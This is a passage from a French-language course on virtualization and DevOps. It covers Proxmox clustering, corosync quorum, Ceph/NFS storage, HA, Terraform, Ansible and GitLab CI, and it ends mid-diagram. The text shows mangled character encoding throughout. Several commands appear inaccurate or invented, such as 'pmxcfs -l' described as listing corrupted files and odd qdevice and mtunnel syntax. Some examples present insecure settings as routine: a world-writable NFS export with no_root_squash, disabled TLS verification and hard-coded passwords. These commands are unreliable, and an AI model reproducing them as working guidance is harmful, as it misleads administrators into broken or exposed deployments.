**Maintenance simplifiÃ©e** : Mise Ã  jour du control plane sans impact sur le trafic de donnÃ©es.

### DÃ©fis et considÃ©rations

**Latence control plane** : Les dÃ©cisions centralisÃ©es peuvent introduire des dÃ©lais.

**Point de dÃ©faillance** : Un control plane centralisÃ© devient critique.

**ComplexitÃ©** : La sÃ©paration ajoute des couches d'abstraction.

**Solutions de mitigation :**

```bash
# HA pour control plane
# Cluster etcd 3 nÅ“uds
etcd --name node1 --initial-cluster node1=http://10.0.100.10:2380,node2=http://10.0.100.11:2380,node3=http://10.0.100.12:2380

# Cache local data plane
# RÃ©plication Ã©tat critique localement
ovs-vsctl set bridge br0 fail_mode=standalone  # Continue sans contrÃ´leur
```

### Cas d'usage spÃ©cialisÃ©s

**Infrastructure cloud** : SÃ©parez les API de gestion (control plane) des hyperviseurs (data plane) pour permettre la maintenance rolling sans impact service.

**RÃ©seau d'entreprise** : Centralisez les politiques de sÃ©curitÃ© dans le control plane tout en distribuant l'application dans les Ã©quipements rÃ©seau.

**Environnement DevOps** : Utilisez des contrÃ´leurs Kubernetes pour orchestrer les dÃ©ploiements (control plane) tout en optimisant l'exÃ©cution sur les nÅ“uds workers (data plane).

---

## 5.3 Proxmox clustering

### Architecture cluster Proxmox

Un **cluster Proxmox** transforme plusieurs serveurs physiques indÃ©pendants en une infrastructure unifiÃ©e capable de gÃ©rer les ressources de maniÃ¨re centralisÃ©e, d'assurer la haute disponibilitÃ©, et de faciliter la migration des charges de travail. Cette architecture distribue l'intelligence tout en maintenant la cohÃ©rence des donnÃ©es et des configurations.

```
Cluster Proxmox 3 nÅ“uds - Architecture complÃ¨te :

                    Management Network (192.168.1.0/24)
                              â”‚
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚                     â”‚                     â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
â”‚ proxmox1     â”‚    â”‚ proxmox2       â”‚    â”‚ proxmox3       â”‚
â”‚ 192.168.1.10 â”‚    â”‚ 192.168.1.11   â”‚    â”‚ 192.168.1.12   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Cluster Node â”‚    â”‚ Cluster Node   â”‚    â”‚ Cluster Node   â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ corosync â”‚ â”‚â—„â”€â”€â–ºâ”‚ â”‚ corosync   â”‚ â”‚â—„â”€â”€â–ºâ”‚ â”‚ corosync   â”‚ â”‚
â”‚ â”‚ quorum   â”‚ â”‚    â”‚ â”‚ quorum     â”‚ â”‚    â”‚ â”‚ quorum     â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ pmxcfs   â”‚ â”‚â—„â”€â”€â–ºâ”‚ â”‚ pmxcfs     â”‚ â”‚â—„â”€â”€â–ºâ”‚ â”‚ pmxcfs     â”‚ â”‚
â”‚ â”‚ (config) â”‚ â”‚    â”‚ â”‚ (config)   â”‚ â”‚    â”‚ â”‚ (config)   â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ VMs/LXC      â”‚    â”‚ VMs/LXC        â”‚    â”‚ VMs/LXC        â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ VM 101   â”‚ â”‚    â”‚ â”‚ VM 102     â”‚ â”‚    â”‚ â”‚ VM 103     â”‚ â”‚
â”‚ â”‚ VM 104   â”‚ â”‚    â”‚ â”‚ VM 105     â”‚ â”‚    â”‚ â”‚ VM 106     â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Storage      â”‚    â”‚ Storage        â”‚    â”‚ Storage        â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Ceph OSD â”‚ â”‚    â”‚ â”‚ Ceph OSD   â”‚ â”‚    â”‚ â”‚ Ceph OSD   â”‚ â”‚
â”‚ â”‚ Local LVMâ”‚ â”‚    â”‚ â”‚ Local LVM  â”‚ â”‚    â”‚ â”‚ Local LVM  â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        â”‚                     â”‚                     â”‚
        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                              â”‚
                    Storage Network (10.0.0.0/24)
                    Corosync Ring (172.16.0.0/24)

Composants cluster :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ corosync    â”‚ Communication inter-nÅ“uds, quorum      â”‚
â”‚ pmxcfs      â”‚ SystÃ¨me de fichiers distribuÃ© config   â”‚
â”‚ pve-cluster â”‚ Gestion cluster, API                    â”‚
â”‚ ha-manager  â”‚ Haute disponibilitÃ© VMs/LXC            â”‚
â”‚ pveproxy    â”‚ Interface web unifiÃ©e                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### CrÃ©ation et configuration cluster

**Initialisation du cluster :**

```bash
# Sur le premier nÅ“ud (proxmox1)
pvecm create production-cluster --bindnet0_addr 192.168.1.10 --ring0_addr 172.16.0.10

# VÃ©rification crÃ©ation
pvecm status
pvecm nodes

# Configuration rÃ©seau corosync (optionnel)
# /etc/pve/corosync.conf
totem {
    version: 2
    cluster_name: production-cluster
    config_version: 1
    transport: knet
    
    interface {
        ringnumber: 0
        bindnetaddr: 192.168.1.0
        mcastaddr: 239.192.1.1
        mcastport: 5405
        ttl: 1
    }
    
    interface {
        ringnumber: 1
        bindnetaddr: 172.16.0.0
        mcastaddr: 239.192.2.1
        mcastport: 5406
        ttl: 1
    }
}

quorum {
    provider: corosync_votequorum
    expected_votes: 3
    two_node: 0
}
```

**Ajout de nÅ“uds au cluster :**

```bash
# Sur chaque nÅ“ud Ã  ajouter (proxmox2, proxmox3)
pvecm add 192.168.1.10 --ring0_addr 172.16.0.11  # proxmox2
pvecm add 192.168.1.10 --ring0_addr 172.16.0.12  # proxmox3

# VÃ©rification sur tous les nÅ“uds
pvecm status
corosync-quorumtool -s

# Test connectivitÃ© cluster
pvecm mtunnel -migration_network 192.168.1.0/24 192.168.1.11
```

### Gestion du quorum

**Configuration quorum adaptatif :**

```bash
# VÃ©rification Ã©tat quorum
corosync-quorumtool -s

# Modification quorum attendu (maintenance)
pvecm expected 2  # Temporaire pour maintenance 1 nÅ“ud

# Retour configuration normale
pvecm expected 3

# Configuration quorum device (witness externe)
pvecm qdevice setup 192.168.1.200  # Serveur witness
pvecm qdevice add device model=net:host=192.168.1.200:port=5403
```

**Gestion des situations de split-brain :**

```bash
# Forcer quorum en cas d'urgence (DANGER)
corosync-quorumtool -e  # Expected votes = current nodes

# Diagnostic problÃ¨mes quorum
journalctl -u corosync
journalctl -u pve-cluster

# Reset cluster en cas de corruption
systemctl stop pve-cluster corosync
rm -rf /etc/corosync/*
rm -rf /etc/pve/nodes/*/pve-ssl.pem
# RecrÃ©er cluster depuis zÃ©ro
```

### Stockage partagÃ© et migration

**Configuration stockage partagÃ© Ceph :**

```bash
# Installation Ceph sur cluster
# Via interface web : Datacenter > Ceph > Install

# Configuration pools dÃ©diÃ©s
ceph osd pool create vm-storage 128 128
ceph osd pool create ct-storage 64 64
ceph osd pool application enable vm-storage rbd
ceph osd pool application enable ct-storage rbd

# Ajout stockage dans Proxmox
pvesm add ceph vm-storage --pool vm-storage --content images
pvesm add ceph ct-storage --pool ct-storage --content rootdir

# Test migration
qm migrate 101 proxmox2 --online --targetstorage vm-storage
```

**Configuration NFS partagÃ© :**

```bash
# Serveur NFS dÃ©diÃ© ou nÅ“ud cluster
apt install nfs-kernel-server

# Configuration exports
echo "/srv/proxmox *(rw,sync,no_root_squash,no_subtree_check)" >> /etc/exports
exportfs -ra

# Ajout dans cluster
pvesm add nfs shared-nfs --server 192.168.1.200 --export /srv/proxmox --content images,vztmpl,backup

# Test accÃ¨s depuis tous nÅ“uds
showmount -e 192.168.1.200
```

### Haute disponibilitÃ© intÃ©grÃ©e

**Configuration HA Manager :**

```bash
# CrÃ©ation groupes HA avec prioritÃ©s
ha-manager groupadd production --nodes "proxmox1:3,proxmox2:2,proxmox3:1" --restricted

ha-manager groupadd development --nodes "proxmox2:2,proxmox3:2,proxmox1:1"

# Activation HA pour VMs critiques
ha-manager add vm:101 --state started --group production --max_restart 3 --max_relocate 1

ha-manager add vm:102 --state started --group production --max_restart 2 --max_relocate 2

# Configuration politiques HA
ha-manager set vm:101 --comment "Production DB - Critical"
```

**Surveillance et gestion HA :**

```bash
# Monitoring Ã©tat HA
ha-manager status
watch -n 5 ha-manager status

# Logs HA dÃ©taillÃ©s
journalctl -u pve-ha-lrm
journalctl -u pve-ha-crm

# Test failover manuel
ha-manager set vm:101 --state relocate --node proxmox2

# Maintenance nÅ“ud (Ã©vacuation VMs)
ha-manager set vm:101 --state freeze  # EmpÃªche migration auto
pvecm mtunnel -migration_network 192.168.1.0/24 proxmox2
qm migrate 101 proxmox2 --online
```

### RÃ©seaux cluster avancÃ©s

**Configuration multi-ring corosync :**

```bash
# Configuration 2 anneaux redondants
# /etc/pve/corosync.conf
totem {
    interface {
        ringnumber: 0
        bindnetaddr: 192.168.1.0    # Management network
        mcastaddr: 239.192.1.1
        mcastport: 5405
    }
    
    interface {
        ringnumber: 1
        bindnetaddr: 172.16.0.0     # Dedicated corosync
        mcastaddr: 239.192.2.1
        mcastport: 5406
    }
}

# Reload configuration
systemctl reload corosync
```

**Optimisation rÃ©seau migration :**

```bash
# Configuration rÃ©seau dÃ©diÃ© migration
# /etc/pve/datacenter.cfg
migration: secure,network=10.0.1.0/24

# Test bande passante migration
iperf3 -s  # Sur nÅ“ud destination
iperf3 -c 10.0.1.11 -t 60 -P 4  # Depuis nÅ“ud source

# Optimisation TCP migration
echo 'net.core.rmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.core.wmem_max = 134217728' >> /etc/sysctl.conf
sysctl -p
```

### Monitoring et maintenance cluster

**Surveillance proactive :**

```bash
# Script monitoring cluster complet
#!/bin/bash
LOGFILE="/var/log/cluster-health.log"
DATE=$(date '+%Y-%m-%d %H:%M:%S')

# VÃ©rification quorum
QUORUM_STATUS=$(corosync-quorumtool -s | grep "Quorate" | awk '{print $2}')
if [ "$QUORUM_STATUS" != "Yes" ]; then
    echo "$DATE - CRITICAL: Cluster not quorate" >> $LOGFILE
    # Alerte critique
fi

# VÃ©rification nÅ“uds
EXPECTED_NODES=3
ONLINE_NODES=$(pvecm nodes | grep -c "online")
if [ $ONLINE_NODES -lt $EXPECTED_NODES ]; then
    echo "$DATE - WARNING: Only $ONLINE_NODES/$EXPECTED_NODES nodes online" >> $LOGFILE
fi

# VÃ©rification services HA
HA_ERRORS=$(ha-manager status | grep -c "error")
if [ $HA_ERRORS -gt 0 ]; then
    echo "$DATE - ERROR: $HA_ERRORS HA services in error state" >> $LOGFILE
fi

# VÃ©rification stockage partagÃ©
CEPH_HEALTH=$(ceph health | grep -c "HEALTH_OK")
if [ $CEPH_HEALTH -eq 0 ]; then
    echo "$DATE - WARNING: Ceph cluster not healthy" >> $LOGFILE
fi
```

**Maintenance prÃ©ventive :**

```bash
# Sauvegarde configuration cluster
tar -czf /root/cluster-backup-$(date +%Y%m%d).tar.gz /etc/pve/

# Nettoyage logs anciens
find /var/log/pve/ -name "*.log" -mtime +30 -delete

# VÃ©rification intÃ©gritÃ© pmxcfs
pmxcfs -l  # Liste fichiers corrompus
```

### DÃ©pannage cluster

**ProblÃ¨mes courants et solutions :**

```bash
# NÅ“ud ne rejoint pas le cluster
# 1. VÃ©rifier connectivitÃ© rÃ©seau
ping 192.168.1.10
telnet 192.168.1.10 5405

# 2. VÃ©rifier certificats
ls -la /etc/pve/nodes/*/pve-ssl.pem

# 3. Reset configuration locale
systemctl stop pve-cluster corosync
rm -rf /etc/corosync/corosync.conf
pvecm add 192.168.1.10

# Split-brain recovery
# 1. Identifier nÅ“ud avec donnÃ©es les plus rÃ©centes
ls -la /etc/pve/

# 2. ArrÃªter services sur nÅ“uds secondaires
systemctl stop pve-cluster corosync

# 3. Forcer quorum sur nÅ“ud principal
corosync-quorumtool -e

# 4. RÃ©intÃ©grer nÅ“uds un par un
pvecm add <node-ip>
```

### Cas d'usage spÃ©cialisÃ©s

**Infrastructure de production :** DÃ©ployez un cluster 5 nÅ“uds avec quorum device externe pour Ã©liminer les risques de split-brain. Configurez des rÃ©seaux dÃ©diÃ©s pour corosync, migration et stockage.

**Environnement de dÃ©veloppement :** Utilisez un cluster 3 nÅ“uds avec stockage local et rÃ©plication pÃ©riodique. Configurez des groupes HA diffÃ©renciÃ©s selon la criticitÃ© des environnements.

**Edge computing :** ImplÃ©mentez des clusters 2 nÅ“uds + witness pour les sites distants avec connectivitÃ© limitÃ©e. Optimisez la configuration corosync pour les latences Ã©levÃ©es.

---


# Module 6 : Cas d'Usage DevOps

## 6.1 Infrastructure as Code

### RÃ©volution de l'Infrastructure as Code

**Infrastructure as Code (IaC)** transforme la gestion d'infrastructure d'un processus manuel et error-prone vers une approche programmatique, versionnÃ©e et reproductible. Cette mÃ©thodologie traite l'infrastructure comme du code logiciel : versionnÃ©e, testÃ©e, et dÃ©ployÃ©e via des pipelines automatisÃ©s.

Imaginez IaC comme la **diffÃ©rence entre construire une maison Ã  la main versus utiliser des plans d'architecte et des outils industriels**. Avec IaC, vous dÃ©finissez une fois votre infrastructure dans du code, puis vous pouvez la reproduire identiquement autant de fois que nÃ©cessaire, dans diffÃ©rents environnements, avec la garantie de cohÃ©rence.

### Principes fondamentaux IaC

**DÃ©claratif vs ImpÃ©ratif** : L'approche dÃ©clarative dÃ©crit l'Ã©tat dÃ©sirÃ© final, tandis que l'approche impÃ©rative dÃ©finit les Ã©tapes pour y parvenir.

```
Approche ImpÃ©rative (Scripts) :
1. CrÃ©er VM avec 4 vCPU
2. Allouer 8GB RAM
3. Attacher disque 100GB
4. Configurer rÃ©seau VLAN 20
5. Installer OS Ubuntu 22.04
6. Configurer SSH
7. Installer Docker
8. DÃ©marrer services

Approche DÃ©clarative (Terraform) :
resource "proxmox_vm_qemu" "web_server" {
  name        = "web-server-01"
  target_node = "proxmox1"
  cores       = 4
  memory      = 8192
  disk {
    size    = "100G"
    storage = "local-lvm"
  }
  network {
    bridge = "vmbr0"
    tag    = 20
  }
  os_type = "ubuntu"
}
```

### Terraform pour Proxmox

**Terraform** excelle dans la gestion d'infrastructure multi-cloud et multi-provider, incluant Proxmox via le provider officiel.

**Installation et configuration :**

```bash
# Installation Terraform
wget https://releases.hashicorp.com/terraform/1.6.0/terraform_1.6.0_linux_amd64.zip
unzip terraform_1.6.0_linux_amd64.zip
sudo mv terraform /usr/local/bin/

# VÃ©rification
terraform version

# Configuration provider Proxmox
# main.tf
terraform {
  required_providers {
    proxmox = {
      source  = "telmate/proxmox"
      version = "2.9.14"
    }
  }
}

provider "proxmox" {
  pm_api_url      = "https://192.168.1.10:8006/api2/json"
  pm_user         = "terraform@pve"
  pm_password     = "secure_password"
  pm_tls_insecure = true
}
```

**CrÃ©ation d'infrastructure complÃ¨te :**

```hcl
# variables.tf
variable "vm_count" {
  description = "Number of VMs to create"
  type        = number
  default     = 3
}

variable "environment" {
  description = "Environment name"
  type        = string
  default     = "production"
}

# templates.tf
resource "proxmox_vm_qemu" "kubernetes_nodes" {
  count       = var.vm_count
  name        = "k8s-node-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  # Template configuration
  clone      = "ubuntu-22.04-template"
  full_clone = true
  
  # Hardware configuration
  cores   = 4
  sockets = 1
  memory  = 8192
  
  # Storage configuration
  disk {
    size     = "50G"
    type     = "scsi"
    storage  = "ceph-storage"
    iothread = 1
    discard  = "on"
  }
  
  # Network configuration
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 20
  }
  
  # Cloud-init configuration
  os_type    = "cloud-init"
  ipconfig0  = "ip=192.168.20.${10 + count.index}/24,gw=192.168.20.1"
  nameserver = "8.8.8.8"
  sshkeys    = file("~/.ssh/id_rsa.pub")
  
  # Lifecycle management
  lifecycle {
    ignore_changes = [
      network,
      disk,
    ]
  }
  
  tags = "${var.environment},kubernetes,terraform"
}

# Load balancer
resource "proxmox_vm_qemu" "load_balancer" {
  name        = "lb-${var.environment}"
  target_node = "proxmox1"
  
  clone      = "ubuntu-22.04-template"
  full_clone = true
  
  cores  = 2
  memory = 4096
  
  disk {
    size    = "20G"
    type    = "scsi"
    storage = "local-lvm"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 30  # DMZ VLAN
  }
  
  ipconfig0 = "ip=192.168.30.10/24,gw=192.168.30.1"
  sshkeys   = file("~/.ssh/id_rsa.pub")
  
  tags = "${var.environment},loadbalancer,terraform"
}

# outputs.tf
output "kubernetes_nodes_ips" {
  value = proxmox_vm_qemu.kubernetes_nodes[*].default_ipv4_address
}

output "load_balancer_ip" {
  value = proxmox_vm_qemu.load_balancer.default_ipv4_address
}
```

### Ansible pour la configuration

**Ansible** complÃ¨te Terraform en gÃ©rant la configuration post-dÃ©ploiement des systÃ¨mes.

**Playbook Kubernetes complet :**

```yaml
# inventory/hosts.yml
all:
  children:
    kubernetes:
      children:
        masters:
          hosts:
            k8s-master-1:
              ansible_host: 192.168.20.10
              node_role: master
        workers:
          hosts:
            k8s-node-1:
              ansible_host: 192.168.20.11
              node_role: worker
            k8s-node-2:
              ansible_host: 192.168.20.12
              node_role: worker
    loadbalancers:
      hosts:
        lb-production:
          ansible_host: 192.168.30.10

# playbooks/site.yml
---
- name: Configure Kubernetes Cluster
  hosts: kubernetes
  become: yes
  vars:
    kubernetes_version: "1.28.0"
    pod_network_cidr: "10.244.0.0/16"
    
  tasks:
    - name: Update system packages
      apt:
        update_cache: yes
        upgrade: dist
        
    - name: Install required packages
      apt:
        name:
          - apt-transport-https
          - ca-certificates
          - curl
          - gnupg
          - lsb-release
        state: present
        
    - name: Add Docker GPG key
      apt_key:
        url: https://download.docker.com/linux/ubuntu/gpg
        state: present
        
    - name: Add Docker repository
      apt_repository:
        repo: "deb [arch=amd64] https://download.docker.com/linux/ubuntu {{ ansible_distribution_release }} stable"
        state: present
        
    - name: Install Docker
      apt:
        name: docker-ce
        state: present
        
    - name: Add Kubernetes GPG key
      apt_key:
        url: https://packages.cloud.google.com/apt/doc/apt-key.gpg
        state: present
        
    - name: Add Kubernetes repository
      apt_repository:
        repo: "deb https://apt.kubernetes.io/ kubernetes-xenial main"
        state: present
        
    - name: Install Kubernetes components
      apt:
        name:
          - kubelet={{ kubernetes_version }}-00
          - kubeadm={{ kubernetes_version }}-00
          - kubectl={{ kubernetes_version }}-00
        state: present
        
    - name: Hold Kubernetes packages
      dpkg_selections:
        name: "{{ item }}"
        selection: hold
      loop:
        - kubelet
        - kubeadm
        - kubectl

- name: Initialize Kubernetes Master
  hosts: masters
  become: yes
  tasks:
    - name: Initialize Kubernetes cluster
      command: >
        kubeadm init
        --pod-network-cidr={{ pod_network_cidr }}
        --apiserver-advertise-address={{ ansible_default_ipv4.address }}
      register: kubeadm_init
      when: inventory_hostname == groups['masters'][0]
      
    - name: Create .kube directory
      file:
        path: /home/{{ ansible_user }}/.kube
        state: directory
        owner: "{{ ansible_user }}"
        group: "{{ ansible_user }}"
        
    - name: Copy admin.conf to user's kube config
      copy:
        src: /etc/kubernetes/admin.conf
        dest: /home/{{ ansible_user }}/.kube/config
        owner: "{{ ansible_user }}"
        group: "{{ ansible_user }}"
        remote_src: yes
        
    - name: Install Flannel CNI
      become_user: "{{ ansible_user }}"
      command: kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml
      when: inventory_hostname == groups['masters'][0]

- name: Join Worker Nodes
  hosts: workers
  become: yes
  tasks:
    - name: Get join command
      shell: kubeadm token create --print-join-command
      register: join_command
      delegate_to: "{{ groups['masters'][0] }}"
      
    - name: Join cluster
      command: "{{ join_command.stdout }}"
```

### GitOps et CI/CD

**GitOps** Ã©tend IaC en utilisant Git comme source de vÃ©ritÃ© pour l'infrastructure et les dÃ©ploiements.

**Pipeline GitLab CI/CD complet :**

```yaml
# .gitlab-ci.yml
stages:
  - validate
  - plan
  - apply
  - configure
  - test

variables:
  TF_ROOT: ${CI_PROJECT_DIR}/terraform
  TF_ADDRESS: ${CI_API_V4_URL}/projects/${CI_PROJECT_ID}/terraform/state/production

before_script:
  - cd ${TF_ROOT}
  - terraform --version
  - terraform init

validate:
  stage: validate
  script:
    - terraform validate
    - terraform fmt -check
  only:
    - merge_requests
    - main

plan:
  stage: plan
  script:
    - terraform plan -out="planfile"
  artifacts:
    paths:
      - ${TF_ROOT}/planfile
    expire_in: 1 week
  only:
    - merge_requests
    - main

apply:
  stage: apply
  script:
    - terraform apply -input=false "planfile"
  dependencies:
    - plan
  only:
    - main
  when: manual

configure:
  stage: configure
  image: ansible/ansible:latest
  script:
    - ansible-galaxy install -r requirements.yml
    - ansible-playbook -i inventory/hosts.yml playbooks/site.yml
  dependencies:
    - apply
  only:
    - main

test:
  stage: test
  script:
    - |
      # Test infrastructure
      ansible all -i inventory/hosts.yml -m ping
      
      # Test Kubernetes cluster
      kubectl get nodes
      kubectl get pods --all-namespaces
      
      # Test application deployment
      kubectl apply -f k8s/test-deployment.yml
      kubectl wait --for=condition=available --timeout=300s deployment/test-app
  only:
    - main
```

### Gestion des secrets et configuration

**Vault integration** pour la gestion sÃ©curisÃ©e des secrets :

```hcl
# vault.tf
data "vault_generic_secret" "proxmox_credentials" {
  path = "secret/proxmox"
}

provider "proxmox" {
  pm_api_url  = "https://192.168.1.10:8006/api2/json"
  pm_user     = data.vault_generic_secret.proxmox_credentials.data["username"]
  pm_password = data.vault_generic_secret.proxmox_credentials.data["password"]
}
```

**Ansible Vault** pour les donnÃ©es sensibles :

```bash
# CrÃ©ation vault
ansible-vault create group_vars/all/vault.yml

# Contenu chiffrÃ©
vault_db_password: "super_secret_password"
vault_api_key: "secret_api_key"

# Utilisation dans playbooks
- name: Configure database
  mysql_user:
    name: app_user
    password: "{{ vault_db_password }}"
    state: present
```

### Monitoring et observabilitÃ© IaC

**Prometheus + Grafana via Terraform :**

```hcl
# monitoring.tf
resource "proxmox_vm_qemu" "monitoring" {
  name        = "monitoring-stack"
  target_node = "proxmox1"
  
  clone      = "ubuntu-22.04-template"
  full_clone = true
  
  cores  = 4
  memory = 8192
  
  disk {
    size    = "100G"
    storage = "ceph-storage"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 10  # Management VLAN
  }
  
  ipconfig0 = "ip=192.168.10.20/24,gw=192.168.10.1"
  sshkeys   = file("~/.ssh/id_rsa.pub")
  
  tags = "monitoring,prometheus,grafana"
}

# Provisioning avec cloud-init
resource "proxmox_cloud_init_disk" "monitoring_ci" {
  name     = "monitoring-ci"
  pve_node = "proxmox1"
  storage  = "local-lvm"
  
  user_data = templatefile("${path.module}/cloud-init/monitoring.yml", {
    hostname = "monitoring-stack"
  })
}
```

---

## 6.2 CI/CD avec virtualisation

### Pipelines CI/CD modernes

Les **pipelines CI/CD (Continuous Integration/Continuous Deployment)** dans un environnement virtualisÃ© offrent une flexibilitÃ© et une scalabilitÃ© exceptionnelles. La virtualisation permet de crÃ©er des environnements de build isolÃ©s, reproductibles, et optimisÃ©s pour chaque type de charge de travail.

Imaginez un pipeline CI/CD comme une **chaÃ®ne de production automobile moderne** : chaque Ã©tape (build, test, dÃ©ploiement) dispose de stations spÃ©cialisÃ©es (VMs dÃ©diÃ©es) qui peuvent Ãªtre adaptÃ©es, rÃ©pliquÃ©es ou remplacÃ©es selon les besoins, sans impacter les autres Ã©tapes de la chaÃ®ne.

### Architecture CI/CD distribuÃ©e

```
Architecture CI/CD sur Proxmox :

                    GitLab/Jenkins Master
                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                    â”‚ Control Plane       â”‚
                    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
                    â”‚ â”‚ Pipeline Engine â”‚ â”‚
                    â”‚ â”‚ Job Scheduler   â”‚ â”‚
                    â”‚ â”‚ Artifact Store  â”‚ â”‚
                    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                              â”‚
                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                    â”‚         â”‚         â”‚
            â”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â” â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â” â”Œâ”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
            â”‚Build Poolâ”‚ â”‚Test Poolâ”‚ â”‚Deploy   â”‚
            â”‚          â”‚ â”‚         â”‚ â”‚Pool     â”‚
